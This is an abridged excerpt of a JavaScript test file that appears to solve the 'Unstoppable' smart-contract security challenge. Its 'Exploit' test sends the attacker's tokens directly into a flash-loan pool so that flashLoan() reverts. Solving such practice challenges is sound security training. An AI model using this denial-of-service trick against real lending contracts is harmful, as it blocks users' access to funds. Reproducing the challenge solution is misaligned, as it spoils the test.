...
describe("[Challenge] Unstoppable", function () {
  ...
  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000"); //1million
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100"); //our initial - 100tkns
  ...
  it("Exploit", async function () {
    ...
    await attackTokenContract.transfer(
      this.pool.address,
      INITIAL_ATTACKER_TOKEN_BALANCE
    ); //transfer the initial tkn to this pool addr/ who is attacker now
...
}); // therefore we exploits and the test passed as it reverts the flashloan()